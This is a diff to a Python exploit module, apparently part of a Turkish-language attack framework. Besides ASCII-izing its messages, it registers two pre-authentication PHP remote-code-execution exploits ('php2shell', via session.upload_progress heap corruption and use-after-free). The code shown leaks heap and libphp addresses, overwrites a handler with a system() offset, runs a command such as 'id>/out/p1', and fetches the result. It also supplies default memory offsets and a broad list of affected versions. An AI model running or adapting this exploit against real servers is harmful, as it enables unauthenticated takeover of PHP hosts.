@@ -307,7 +307,7 @@ def run(params: dict) -> dict:
 
     if len(cmd.encode()) > MAX_CMD:
         return {"ok": False, "success": False,
-                "error": f"komut {len(cmd.encode())} byte; 167-byte taşıyıcı max {MAX_CMD} (örn. 'sh</out/c')"}
+                "error": f"komut {len(cmd.encode())} byte; 167-byte tasiyici max {MAX_CMD} (orn. 'sh</out/c')"}
 
     tgt_p = _net.parse_target(url, default_port=80)
     # Extract the path from the URL (e.g. http://host:port/p.php -> /p.php)
@@ -342,12 +342,12 @@ def run(params: dict) -> dict:
         if chunk:
             log.append(f"[+] chunk base = 0x{chunk:x}")
             break
-        log.append("[-] heap leak kaçtı")
+        log.append("[-] heap leak kacti")
         ex.rotate()
     if not chunk:
         return {"ok": True, "success": False, "status": None,
                 "evidence": "", "detail": {"stage": "stage1_failed",
-                                           "note": "heap chunk leak alınamadı (mitigation/profil/offset uyumsuz)"},
+                                           "note": "heap chunk leak alinamadi (mitigation/profil/offset uyumsuz)"},
                 "log": log}
     ex.rotate()
 
@@ -363,12 +363,12 @@ def run(params: dict) -> dict:
         if libphp:
             log.append(f"[+] libphp base = 0x{libphp:x}")
             break
-        log.append("[-] libphp leak kaçtı")
+        log.append("[-] libphp leak kacti")
         ex.rotate()
     if not libphp:
         return {"ok": True, "success": False, "status": None,
                 "evidence": "", "detail": {"stage": "stage2_failed", "chunk_base": hex(chunk),
-                                           "note": "libphp base leak alınamadı (dtor offset build'e uymuyor olabilir)"},
+                                           "note": "libphp base leak alinamadi (dtor offset build'e uymuyor olabilir)"},
                 "log": log}
     ex.rotate()
 
@@ -381,7 +381,7 @@ def run(params: dict) -> dict:
         try:
             ex.stage3(htdata_abs, zif_abs)
         except OSError as e:
-            log.append(f"[-] stage3 istek hatası: {e}")
+            log.append(f"[-] stage3 istek hatasi: {e}")
         time.sleep(0.8)
 
     # ---- proof: GET the webroot proof path (real `id`) ----
@@ -394,7 +394,7 @@ def run(params: dict) -> dict:
             evidence = r["body"].decode("latin1", "replace").strip()
         log.append(f"[*] proof GET {proof_fetch} -> HTTP {status}, {len(r['body'])} byte")
     except Exception as e:
-        log.append(f"[-] proof fetch hatası: {e}")
+        log.append(f"[-] proof fetch hatasi: {e}")
 
     success = bool(evidence) and ("uid=" in evidence or evidence.strip())
     return {
@@ -419,17 +419,17 @@ EXPLOITS = {
         "name": "php2shell OOM corruption RCE (session.upload_progress)",
         "type": "RCE", "preauth": True,
         "affected": ["5.4", "5.5", "5.6", "7.0", "7.1", "7.2", "7.3", "7.4", "8.0", "8.1", "8.2", "8.3", "8.4", "8.5"],
-        "note": "Native engine — scanner socket'ı açar, 3 aşamayı atar, id kanıtını GET ile okur. Gerekli: memory_limit<post_max, display_errors=1, profil/offset build ile uyumlu.",
+        "note": "Native engine — scanner socket'i acar, 3 asamayi atar, id kanitini GET ile okur. Gerekli: memory_limit<post_max, display_errors=1, profil/offset build ile uyumlu.",
         "inputs": [
-            {"key": "url", "label": "Hedef PHP sayfası", "req": True, "default": "",
-             "placeholder": "http://192.168.8.123:18111/index.php"},
+            {"key": "url", "label": "Hedef PHP sayfasi", "req": True, "default": "",
+             "placeholder": "http://LAB_IP:18111/index.php"},
             {"key": "cmd", "label": "Komut (max 14 byte)", "req": False, "default": "id>/out/p1"},
             {"key": "profile", "label": "Profil", "req": False, "default": "bookworm"},
             {"key": "zif", "label": "zif_system offset (hex)", "req": False, "default": "465370"},
             {"key": "dtor", "label": "ZVAL_PTR_DTOR offset (hex)", "req": False, "default": "65eb60"},
             {"key": "htdata", "label": "htdata offset (hex)", "req": False, "default": "690d8"},
-            {"key": "proof_fetch", "label": "Kanıt path (webroot)", "req": False, "default": "/out/p1"},
-            {"key": "retries", "label": "Retry (aşama başına)", "req": False, "default": "3"},
+            {"key": "proof_fetch", "label": "Kanit path (webroot)", "req": False, "default": "/out/p1"},
+            {"key": "retries", "label": "Retry (asama basina)", "req": False, "default": "3"},
         ],
         "run": run,
     },
@@ -437,17 +437,17 @@ EXPLOITS = {
         "name": "php2shell stale-global-state UAF RCE (session.upload_progress)",
         "type": "RCE", "preauth": True,
         "affected": ["5.4", "5.5", "5.6", "7.0", "7.1", "7.2", "7.3", "7.4", "8.0", "8.1", "8.2", "8.3", "8.4", "8.5"],
-        "note": "109619 = stale global state / UAF; aynı RFC1867 vektörü, aynı native engine (109618+109619).",
+        "note": "109619 = stale global state / UAF; ayni RFC1867 vektoru, ayni native engine (109618+109619).",
         "inputs": [
-            {"key": "url", "label": "Hedef PHP sayfası", "req": True, "default": "",
-             "placeholder": "http://192.168.8.123:18111/index.php"},
+            {"key": "url", "label": "Hedef PHP sayfasi", "req": True, "default": "",
+             "placeholder": "http://LAB_IP:18111/index.php"},
             {"key": "cmd", "label": "Komut (max 14 byte)", "req": False, "default": "id>/out/p1"},
             {"key": "profile", "label": "Profil", "req": False, "default": "bookworm"},
             {"key": "zif", "label": "zif_system offset (hex)", "req": False, "default": "465370"},
             {"key": "dtor", "label": "ZVAL_PTR_DTOR offset (hex)", "req": False, "default": "65eb60"},
             {"key": "htdata", "label": "htdata offset (hex)", "req": False, "default": "690d8"},
-            {"key": "proof_fetch", "label": "Kanıt path (webroot)", "req": False, "default": "/out/p1"},
-            {"key": "retries", "label": "Retry (aşama başına)", "req": False, "default": "3"},
+            {"key": "proof_fetch", "label": "Kanit path (webroot)", "req": False, "default": "/out/p1"},
+            {"key": "retries", "label": "Retry (asama basina)", "req": False, "default": "3"},
         ],
         "run": run,
     },
